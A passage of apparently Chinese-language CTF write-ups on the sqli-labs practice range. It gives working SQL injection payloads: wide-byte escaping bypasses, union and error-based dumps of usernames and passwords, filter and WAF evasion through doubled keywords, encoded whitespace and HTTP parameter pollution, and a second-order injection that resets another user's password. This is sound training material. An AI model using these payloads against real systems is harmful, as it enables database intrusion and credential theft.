（1）使用mysql_set_charset(GBK)指定字符集</span><br><span class="line">    （2）使用mysql_real_escape_string进行转义</span><br><span class="line">    原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面df 和 5c拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢？</span><br><span class="line">    就是使用mysql_set_charset进行指定。</span><br><span class="line">    上述的两个条件是“与”运算的关系，少一条都不行。</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181807608.png" alt="image-20220318180735490"></p><p>可以发现这里是先进行了对id参数先进行了转义,在进行gbk编码,这就造成了宽字节注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆位置:</span><br><span class="line">0%bb%5c%5c%27 union select 1,2,3-- #</span><br><span class="line">爆数据库:</span><br><span class="line">-1%E6&#x27; union select 1,2,database()--+</span><br><span class="line">爆表:</span><br><span class="line">-1%E6&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 --+</span><br><span class="line">爆列名:</span><br><span class="line">-1%E6&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273--+</span><br><span class="line">爆值:</span><br><span class="line">-1%E6&#x27; union select 1,group_concat(username,0x7e,password),3 from security.users --+</span><br></pre></td></tr></table></figure><h2 id="less-37POST型-绕过-MYSQL-real-escape-string"><a href="#less-37POST型-绕过-MYSQL-real-escape-string" class="headerlink" title="less-37POST型 - 绕过 MYSQL_real_escape_string"></a>less-37POST型 - 绕过 MYSQL_real_escape_string</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181828809.png" alt="image-20220318182809707"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181828014.png" alt="image-20220318182858928"></p><p>可见基本一致直接绕过就可</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203181832301.png" alt="image-20220318183210210"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆位置:</span><br><span class="line">uname=-admin%E3&#x27; union select 1,2 --+&amp;passwd=admin&amp;submit=Submit</span><br><span class="line"> 爆表:</span><br><span class="line"> uname=-admin%E3&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+&amp;passwd=admin&amp;submit=Submit</span><br><span class="line">暴字段:</span><br><span class="line">uname=-admin%E3&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+&amp;passwd=admin&amp;submit=Submit</span><br><span class="line">暴值:</span><br><span class="line">uname=-admin%E3&#x27; union select 1,group_concat(username,0x3a,password) from users --+&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs靶场记录双服务器(六)</title>
      <link href="/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%8F%8C%E6%9C%8D%E5%8A%A1%E5%99%A8(%E5%85%AD)/"/>
      <url>/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E5%8F%8C%E6%9C%8D%E5%8A%A1%E5%99%A8(%E5%85%AD)/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlilabs靶场记录双服务器-六"><a href="#sqlilabs靶场记录双服务器-六" class="headerlink" title="sqlilabs靶场记录双服务器(六)"></a>sqlilabs靶场记录双服务器(六)</h1><h2 id="搭建双服务器Tomcat和Apache"><a href="#搭建双服务器Tomcat和Apache" class="headerlink" title="搭建双服务器Tomcat和Apache"></a>搭建双服务器Tomcat和Apache</h2><p>由于第29，30，31关需要双服务器环境，即Tomcat和Apache。这里以win2003为环境，利用JSP和PHPStudy来搭建服务器，由于我们已经在PHPStudy上搭建好了Apache服务器，现在只需要在JSP上搭建Tomcat即可。<br>首先下载JSP</p><p><a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></p><p>sqli-labs文件夹下面还有tomcat文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172211328.png" alt="image-20220317221150218"></p><p>解压放到JSPstudy的www目录下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172212735.png" alt="image-20220317221215602"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172212581.png" alt="image-20220317221228439"></p><p>需要改文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172213600.png" alt="image-20220317221327425"></p><p>改两处,改成自己的配置,接着改30和31关</p><h2 id="less-29基于错误GET双服务器单引号字符型注入"><a href="#less-29基于错误GET双服务器单引号字符型注入" class="headerlink" title="less-29基于错误GET双服务器单引号字符型注入"></a>less-29基于错误GET双服务器单引号字符型注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172216081.png" alt="image-20220317221639853"></p><p>服务器双层架构</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172216720.png" alt="image-20220317221650564"></p><p>服务器端有两个部分,第一部分是Tomcat为引擎的jsp型服务器,第二部分为apache为引擎的php服务器,真正提供web服务的是php服务器</p><p>工作流程为:client访问服务器,能直接访问到Tomcat服务器,然后tomcat服务器在向Apache服务器请求数据,数据返回路径刚好相反</p><p>参数解析问题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?id=1&amp;id=2,这个时候是回显id=1还是id=2呢?</span><br><span class="line">答:apache(php)解析最后一个参数,即回显id=2;而tomcat(jsp)解析第一个参数,即回显id=1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172222840.png" alt="image-20220317222232693"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.jsp?id=1&amp;id=2，针对这关的两层结构，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 </span><br><span class="line">答:tomcat 请求 apache，apache 解析最后一个参数。那么最终返回客户端的是哪个参数？</span><br><span class="line">此处应该还是id=2，因为实际上提供服务的是 apache 服务器，返回的数据也应该是 apache 处理的数据。</span><br><span class="line"></span><br><span class="line">而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一个 WAF。</span><br><span class="line"></span><br><span class="line">而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。如 payload：index.jsp?id=1&amp;id=0 or 1=1--+，tomcat 只检查第一个参数id=1，而对第二个参数id=0 or 1=1--+不做检查，直接传给了 apache，apache 恰好解析第二个参数，便达到了攻击的目的。</span><br><span class="line"></span><br><span class="line">该用法就是 HPP（HTTP Parameter Pollution）即 HTTP 参数污染攻击的一个应用。HPP 可对服务器和客户端都能够造成一定的威胁。</span><br></pre></td></tr></table></figure><p>注入测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.184.39.243:8080/sqlilabs/Less-29/?id=1回显正常</span><br><span class="line">http://10.184.39.243:8080/sqlilabs/Less-29/?id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172226113.png" alt="image-20220317222614870"></p><p>点击返回</p><p>从跳转到.jsp页面可以看出来是 Tomcat 服务器，一般来说，现在没有拿 jsp 写后台的了，大都用 php ，我们果断猜测是双服务器。</p><p>注入点测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.184.39.243:8080/sqlilabs/Less-29/?id=1&amp;id=1回显正常</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.184.39.243:8080/sqlilabs/Less-29/?id=1&amp;id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172228666.png" alt="image-20220317222802546"></p><p>有正确回显和错误回显，单引号无小括号，剩下的事就好办了，可以发现没有其他任何的过滤条件，是最简单的注入之一。</p><h2 id="less-30基于错误GET双服务器双引号字符型盲注"><a href="#less-30基于错误GET双服务器双引号字符型盲注" class="headerlink" title="less-30基于错误GET双服务器双引号字符型盲注"></a>less-30基于错误GET双服务器双引号字符型盲注</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172231783.png" alt="image-20220317223127563"></p><p>有正确回显但无错误回显,所以可以盲注，延时注入，联合注入</p><h2 id="less-31基于错误GET双服务器双引号小括号字符型注入"><a href="#less-31基于错误GET双服务器双引号小括号字符型注入" class="headerlink" title="less-31基于错误GET双服务器双引号小括号字符型注入"></a>less-31基于错误GET双服务器双引号小括号字符型注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203172233128.png" alt="image-20220317223320955"></p><p>和前面的做法一样，只不过这里是小括号+双引号闭合罢了</p><p>从以上三关中，我们主要学习到的是不同服务器对于参数的不同处理，HPP 的应用有<br>很多，不仅仅是我们上述列出过 WAF 一个方面，还有可以执行重复操作，可以执行非法操<br>作等。同时针对 WAF 的绕过，我们这里也仅仅是抛砖引玉，后续的很多的有关 HPP 的方法<br>需要共同去研究。这也是一个新的方向。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs靶场记录中级关(五)</title>
      <link href="/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%BA%A7%E5%85%B3(%E4%BA%94)/"/>
      <url>/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%BA%A7%E5%85%B3(%E4%BA%94)/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlilabs靶场记录中级关-五"><a href="#sqlilabs靶场记录中级关-五" class="headerlink" title="sqlilabs靶场记录中级关(五)"></a>sqlilabs靶场记录中级关(五)</h1><h2 id="less-23基于错误的，过滤注释的GET型"><a href="#less-23基于错误的，过滤注释的GET型" class="headerlink" title="less-23基于错误的，过滤注释的GET型"></a>less-23基于错误的，过滤注释的GET型</h2><p>显然根据提示会过滤注释符,先把之前语句试一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1正常</span><br><span class="line">id=1&#x27; version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1 </span><br><span class="line">id=1&quot;正常</span><br></pre></td></tr></table></figure><p>试着闭合一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; or 1=1-- # 报错</span><br><span class="line">id=1&#x27; or 1=1--+  报错</span><br><span class="line">id=1&#x27; or 1=1# 报错</span><br><span class="line">id=1&#x27; or 1=1%23</span><br></pre></td></tr></table></figure><p>显然注释符闭合不了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171619714.png" alt="image-20220317161901626"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>那么我们试着闭合一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; order by 4 and &#x27;1&#x27;=&#x27;1&#x27; LIMIT 0,1</span><br><span class="line">1&#x27; order by 4 and &#x27;1&#x27;=&#x27;1</span><br><span class="line">或者</span><br><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; order by &#x27;4&#x27; LIMIT 0,1</span><br><span class="line">1&#x27; order by &#x27;4</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171626164.png" alt="image-20220317162609043"></p><p>请注意,这里的字段数为4是不正确的,因为我们知道,数据库里面的字段数是3.</p><p>那么这里并没有报错是因为什么原因呢</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171628619.png" alt="image-20220317162812522"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">where 与 order by 都是子句,and是操作符,用于where子句中</span><br><span class="line">在mysql执行的顺序中,where是远在order by 之前的</span><br><span class="line">order by 在where 的条件中,在where执行时被忽略了,结果集生成后并未在执行order by </span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171632831.png" alt="image-20220317163248748"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从上面的操作中，我们推断出第一个操作中没有报错，说明order by语句没有执行是因为order by后面的字段(名，序号，别名)是不能加引号的，虽然不会报错，但数据库会不执行该语句。</span><br></pre></td></tr></table></figure><p>这关不能使用order by来判断字段数,可以直接使用union进行联合查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; union select 1,2,3,4 or &#x27;1&#x27;=&#x27;1&#x27; LIMIT 0,1</span><br><span class="line">1&#x27; union select 1,2,3,4 or &#x27;1&#x27;=&#x27;1</span><br><span class="line">或者</span><br><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; union select 1,2,3,4 and &#x27;1&#x27;=&#x27;1&#x27; LIMIT 0,1</span><br><span class="line">1&#x27; union select 1,2,3,4 and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171635708.png" alt="image-20220317163543605">特别注意：这里的or和and作为了联合查询第二select个语句的条件而不是第一个select语句where的条件。</p><p>当 id&#x3D;’1’ union select 1,2,3,4 or ‘1’&#x3D;’1’ LIMIT 0,1 就变成 id&#x3D;’1’ union select 1,2,3,4 or true LIMIT 0,1   </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.当select 1,2,3,4为真时，原句等于： id=&#x27;1&#x27; union select 1,2,3,4 LIMIT 0,1 返回我们要查询的结果</span><br><span class="line">2.当select 1,2,3,4为假时，原句等于： id=&#x27;1&#x27; union select true LIMIT 0,1 也就是 id=&#x27;1&#x27; union select 1 LIMIT 0,1  这个语句必定报错因为第一个select语句中的users表里有3个字段，与union联合查询的第二个select查询的字段数量不一致。</span><br></pre></td></tr></table></figure><p>当 id&#x3D;’1’union select 1,2,3,4 and ‘1’&#x3D;’1’ LIMIT 0,1 就变成 id&#x3D;’1’ union select 1,2,3,4 and true LIMIT 0,1 即 id&#x3D;’1’ union select 1,2,3,4 LIMIT 0,1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果select 1,2,3,4为真，原句：id=&#x27;1&#x27; union select 1,2,3,4 LIMIT 0,1  返回我们的结果</span><br><span class="line">如果select 1,2,3,4为假，原句：id=&#x27;1&#x27; union select 1,2,3,4 LIMIT 0,1  会直接报错，因为两个查询语句的字段数量不一致。</span><br></pre></td></tr></table></figure><p>接着查询返回信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171638772.png" alt="image-20220317163845655"></p><p>这里的passwd的1 并不是select 1,2,3中的1,原因是这里的or’1’&#x3D;’1’是作为字段三的逻辑运算符,因为永真条件,在字段三种会回显1,所以字段三是不可以利用的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆库:</span><br><span class="line">-1&#x27; union select 1,database(),3 or &#x27;1&#x27;=&#x27;1</span><br><span class="line">爆表:</span><br><span class="line">-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br><span class="line">或者</span><br><span class="line">-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1</span><br><span class="line">字段:</span><br><span class="line">-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br><span class="line">数据:</span><br><span class="line">-1&#x27; union select 1,(select group_concat(concat_ws(&#x27;-&#x27;,id,username,password)) from users),3 and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>但是这里注意在爆数据的时候，不能在使用and的时候直接查询，必须要用双子注入查询，否则会报错</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,group_concat(username),3 from users and &#x27;1&#x27;=&#x27;1   from和and是不能连在一起用的）</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171645404.png" alt="image-20220317164518297"></p><p>但是也可以这样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(username),3 from users where 1 and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171645578.png" alt="image-20220317164552460"></p><p><strong>盲注</strong></p><p>这里盲注就得使用and，而不能使用or   </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and left(version(),1)=5 and &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27; and left(version(),1)=6 and &#x27;1&#x27;=&#x27;1</span><br><span class="line">and和or同时使用and的优先级高于or,哪怕不考虑优先级也不能使用or,因为 &#x27;1&#x27;=&#x27;1&#x27;是永真条件，不管前面查询的条件时真假，到最后都会变成 真条件</span><br></pre></td></tr></table></figure><p><strong>extractvalue</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171648467.png" alt="image-20220317164836367"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) or &#x27;1&#x27;=&#x27;1</span><br><span class="line">使用逻辑运算符or，按照正常推断该语句是不会报错的应该会正常回显，但结果报错了，说明是extractvalue搞的鬼，至于原理还不是很清楚，所以为了验证特意找了Less-12，看使用and和or是否有区别：</span><br></pre></td></tr></table></figure><p><strong>进阶闭合</strong></p><p>select 1 等同于 select ‘1’</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库:</span><br><span class="line">-1&#x27; union select 1,database(),&#x27;3</span><br><span class="line">-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),&#x27;3</span><br><span class="line">爆表</span><br><span class="line">-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#x27;3</span><br><span class="line">字段:</span><br><span class="line">-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),&#x27;3</span><br><span class="line">数据:</span><br><span class="line">-1&#x27; union select 1,(select group_concat(concat_ws(&#x27;-&#x27;,id,username,password)) from users),&#x27;3</span><br></pre></td></tr></table></figure><h2 id="less-24POST型基于存储的二次注入"><a href="#less-24POST型基于存储的二次注入" class="headerlink" title="less-24POST型基于存储的二次注入"></a>less-24POST型基于存储的二次注入</h2><p>先随便点点</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171657674.png" alt="image-20220317165750536"></p><p>登录页面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171658674.png" alt="image-20220317165810551"></p><p>创建用户</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171658564.png" alt="image-20220317165834393"></p><p>不让改密码,让黑了它</p><p>先注册一个用户:username:1 passwd:1</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171659317.png" alt="image-20220317165953156"></p><p>简单分析一下源码可以发现在修改用户名这里,从session中直接获得了用户名,并且直接用于更新语句并未做检查,从根本上来说,插入数据时没有做过滤,只是做了转义处理</p><p>也就是说当前用户中如果含有注释,便可以更改当前用户名中包含的另一用户的密码,例如注册用户:Dumb’– +那么他就可以更改Dumb的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; WHERE username=&#x27;1&#x27;-- # and password=&#x27;$curr_pass&#x27;</span><br></pre></td></tr></table></figure><p>这里我们注册用户名为1’– #去更改我们已知的1用户的密码</p><p>这里username:1’– # passwd:2</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171707403.png" alt="image-20220317170732295"></p><p>登录进去开始重置1用户的密码</p><p>我们将1 用户的密码改为3</p><p>接着回到登录界面使用username:1 passwd:成功登录进去</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171709261.png" alt="image-20220317170908116"></p><h2 id="less-25GET-基于错误-您所有的OR＆AND都属于我们"><a href="#less-25GET-基于错误-您所有的OR＆AND都属于我们" class="headerlink" title="less-25GET-基于错误-您所有的OR＆AND都属于我们"></a>less-25GET-基于错误-您所有的OR＆AND都属于我们</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171751956.png" alt="image-20220317175153760"></p><p>返回的页面信息,其中有用户登录的信息,最下面有个提示,你的输入会进行过滤</p><p>先进行闭合测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1正常显示</span><br><span class="line">1&#x27; version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1 </span><br><span class="line">1&quot;正常显示</span><br></pre></td></tr></table></figure><p>可以发现是单引号闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;-- # 接着注释尝试发现可以正常使用注释</span><br></pre></td></tr></table></figure><p>当输入and 或者 or 时发现有过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and 1=1-- #</span><br><span class="line">1&#x27;or 1=1-- #</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171800903.png" alt="image-20220317180053783"></p><p>查看源码发现过滤信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171801627.png" alt="image-20220317180138532"></p><p>这里可以发现对大小写不敏感 也就是大小写都进行匹配,但是这里只进行了一次过滤,也就是可以双写绕过,因为这里是过滤为空</p><p>基本绕过思路</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一次性的过滤为空:</span><br><span class="line">可以双写绕过</span><br><span class="line">非一次行的:</span><br><span class="line">大小写变形绕过  or=Or=oR=OR</span><br><span class="line">利用运算符or=||  and=&amp;&amp;</span><br><span class="line">url编码绕过#=%23,hex编码 ~=0x7e</span><br><span class="line">添加注释/*or*/</span><br></pre></td></tr></table></figure><p>在开始注入之前要说一下,在url中空格和一些特殊字符会进行url编码:#是%23 空格时%20</p><p><strong>双写绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;oorr 1=1-- #回显正常</span><br></pre></td></tr></table></figure><p>爆列数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; oorrder by 4-- #Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br><span class="line">1&#x27; oorrder by 3-- #回显正常</span><br></pre></td></tr></table></figure><p>查看回显字段位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,3-- #回显2,3</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库:</span><br><span class="line">-1&#x27; union select 1,database(),3-- #</span><br><span class="line">爆表:</span><br><span class="line">-1&#x27; union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27;),3-- #</span><br><span class="line">爆字段:</span><br><span class="line">-1&#x27; union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_schema=&#x27;security&#x27; anandd table_name=&#x27;users&#x27;),3-- #</span><br><span class="line">爆数据:</span><br><span class="line">-1&#x27; union select 1,(select group_concat(concat_ws(&#x27;-&#x27;,id,username,passwoorrd)) from users),3-- #</span><br></pre></td></tr></table></figure><p><strong>运算符绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; || extractvalue(1,concat(0x7e,database()))-- #</span><br><span class="line">1&#x27; || extractvalue(1,concat(0x7e,database()))-- #  </span><br></pre></td></tr></table></figure><h2 id="less-25a基于Bool-GET-过滤AND-x2F-OR-数字型-盲注"><a href="#less-25a基于Bool-GET-过滤AND-x2F-OR-数字型-盲注" class="headerlink" title="less-25a基于Bool_GET_过滤AND&#x2F;OR_数字型_盲注"></a>less-25a基于Bool_GET_过滤AND&#x2F;OR_数字型_盲注</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171814700.png" alt="image-20220317181415495"></p><p>测试闭合方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1回显正常</span><br><span class="line">1&#x27;  mysql_fetch_array() expects parameter 1 to be resource</span><br><span class="line">1&quot; mysql_fetch_array() expects parameter 1 to be resource,</span><br></pre></td></tr></table></figure><p>这里就可以说明是数字性注入</p><p>本关与Less-25十分相似，既可以正常union注入也可以用脚本Bool或Time盲注。但却不能报错注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 || extractvalue(1,concat(0x7e,database()))-- #  </span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171816039.png" alt="image-20220317181656940"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171817201.png" alt="image-20220317181727080"></p><p>原因是这里关闭了错误报告</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果在一个php文件最前面写入函数error_reporting(0)那么，这一个页面将不会返回任何warning（警告）信息，不影响其他php文件</span><br></pre></td></tr></table></figure><h2 id="less-26GET-基于错误-您所有的空格和注释都属于我们"><a href="#less-26GET-基于错误-您所有的空格和注释都属于我们" class="headerlink" title="less-26GET-基于错误-您所有的空格和注释都属于我们"></a>less-26GET-基于错误-您所有的空格和注释都属于我们</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171819784.png" alt="image-20220317181923579"></p><p>这里可以发现过滤了许多字符</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171822107.png" alt="image-20220317182203004"></p><p>不仅过滤了上一关的or与and,还过滤了单行注释–与#(包含url编码)以及多行注释&#x2F;**&#x2F;(被解释为空格,通常用于过滤空格时),还过滤了空格,以及正反斜杠&#x2F;与.</p><p>对于注释和结尾字符我们此处只能利用构造一个’来闭合后面的’;对于空格,有较多的办法:</p><p>空格的url编码替代方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%09 TAB水平</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c新建一页</span><br><span class="line">%0dreturn功能</span><br><span class="line">%0bTAB(垂直)</span><br><span class="line">%a0空格</span><br></pre></td></tr></table></figure><p>暴库：（注：url编码%26是运算符&amp;，下面的%26%26换成运算符||也是可以的，但不能直接用&amp;&amp;，会报错，原理还不清楚，但使用&amp;的url编码%26就不会报错）</p><p>但是这里经过尝试一个都不行</p><p>报错注入试一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库:</span><br><span class="line">&#x27;||updatexml(1,concat(&#x27;$&#x27;,(database())),0)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">爆表:</span><br><span class="line">&#x27;||updatexml(1,concat(&#x27;$&#x27;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;))),0)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">爆字段:</span><br><span class="line">&#x27;||updatexml(1,concat(&#x27;$&#x27;,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#x27;security&#x27;)%26%26(table_name=&#x27;users&#x27;))),0)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">爆数据:</span><br><span class="line">&#x27;||updatexml(1,concat(&#x27;$&#x27;,(select(concat(&#x27;$&#x27;,id,&#x27;$&#x27;,username,&#x27;$&#x27;,passwoorrd))from(users)limit%0b0,1)),0)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>布尔盲注</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;%26%26(ascii(mid((select(group_concat(schema_name))from(infoorrmation_schema.schemata)),1,1))&gt;65)||&#x27;1&#x27;=&#x27;</span><br></pre></td></tr></table></figure><h2 id="less-26a基于错误-GET-过滤空格-x2F-注释单引号小括号字符型盲注"><a href="#less-26a基于错误-GET-过滤空格-x2F-注释单引号小括号字符型盲注" class="headerlink" title="less-26a基于错误_GET_过滤空格&#x2F;注释单引号小括号字符型盲注"></a>less-26a基于错误_GET_过滤空格&#x2F;注释单引号小括号字符型盲注</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203171902898.png" 